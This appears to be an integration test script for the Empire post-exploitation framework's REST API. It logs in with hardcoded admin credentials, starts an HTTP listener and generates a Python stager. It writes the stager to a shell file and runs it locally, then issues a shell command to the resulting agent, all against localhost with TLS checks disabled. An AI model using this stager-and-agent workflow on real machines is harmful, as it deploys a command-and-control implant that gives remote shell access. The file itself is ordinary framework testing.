#!/usr/bin/python

import urllib2, sys, os, json, ssl
from time import sleep

print "Starting test....."
sleep(12) # Wait for the Rest API to become available
baseurl = "https://127.0.0.1:1337"
endpoint = "/api/admin/login"
headers = {"Content-Type":"application/json"}


# Authentication Test
print "Testing authentication..."
data = {"username":"empireadmin", "password":"Password123!"} 

jdata = json.dumps(data)
dlen = len(jdata)
headers['Content-Length'] = dlen
request = urllib2.Request(baseurl+endpoint, jdata, headers)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

jresp = json.loads(resp.read())

token = jresp['token'].encode('ascii')


if token == '' or not token:
    print "Failed authentication test:"
    print "Failed to obtain token"
    print "Request response: %s" % (resp.reason)
    sys.exit(0)

print "Token: %s\n" % (token)

# Version test
print "Obtaining version...."
endpoint = "/api/version?token=%s" % (token)
request = urllib2.Request(baseurl+endpoint)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

jresp = json.loads(resp.read())

version = jresp['version'].encode('ascii')

if version == '' or not version:
    print "Failed version test"
    print "Request response: %s" % (resp.reason)
    sys.exit(0)

print "Version: %s\n" % (version)

# Listener Test
print "Starting Listener..."
endpoint = "/api/listeners/http?token=%s" % (token)

data = {"Name":"debug"}
jdata = json.dumps(data)
dlen = len(jdata)
headers['Content-Length'] = dlen
request = urllib2.Request(baseurl+endpoint, jdata, headers)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

r = json.loads(resp.read())

try:
    print r['success'].encode('ascii') + "\n"
except KeyError:
    print r['error'].encode('ascii') + "\n"
    print "Failed listener test\n"

# Launcher/Stager test
print "Generating python launcher...."
endpoint = "/api/stagers?token=%s" % (token)
data = {"StagerName":"multi/launcher", "Listener":"debug", "Language":"python"}

jdata = json.dumps(data)
dlen = len(jdata)
headers['Content-Length'] = dlen
request = urllib2.Request(baseurl+endpoint, jdata, headers)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

r = json.loads(resp.read())

try:
    print r['multi/launcher']['Output'].encode('ascii') + "\n"
    stager = r['multi/launcher']['Output'].encode('ascii')
except KeyError:
    print "Failed Launcher/stager test\n"
    print "Response: %s" % (resp.reason)
    sys.exit(0)

f = open('agent.sh', 'w')
f.write(stager)
f.close()

# Agent test
print "Spawning agent locally......"
os.system('/bin/bash agent.sh')
sleep(5) # Wait for the agent to stage
endpoint = "/api/agents?token=%s" % (token)

request = urllib2.Request(baseurl+endpoint)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

r = json.loads(resp.read())

try:
    print "Agent: %s" % (r['agents'][0]['name'].encode('ascii'))
    agentName = r['agents'][0]['name'].encode('ascii')
except:
    print "Failed to spawn agent"
    print "Response: %s" % (resp.code)


# Agent command test
print "Sending agent shell command....."
data = {"command":"ps -ef"}
endpoint = "/api/agents/%s/shell?token=%s" % (agentName, token)

jdata = json.dumps(data)
dlen = len(jdata)
headers['Content-Length'] = dlen
request = urllib2.Request(baseurl+endpoint, jdata, headers)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

r = json.loads(resp.read())

try:
    print "Result: %s" % (str(r['success']))
except:
    print "Command test failed"
    print "Response: %s" % (resp.code)

# Agent result test
print "Obtaining shell command result....."
sleep(5) # wait for the command results
endpoint = "/api/agents/%s/results?token=%s" % (agentName, token)
request = urllib2.Request(baseurl+endpoint)
resp = urllib2.urlopen(request, context=ssl._create_unverified_context())

r = json.loads(resp.read())

try:
    print "Result: %s" % (r['results'][0]['AgentResults'][0]['results'].encode('ascii'))
except:
    print "Result test failed"
    print "Response: %s" % (resp.reason)
    sys.exit(0)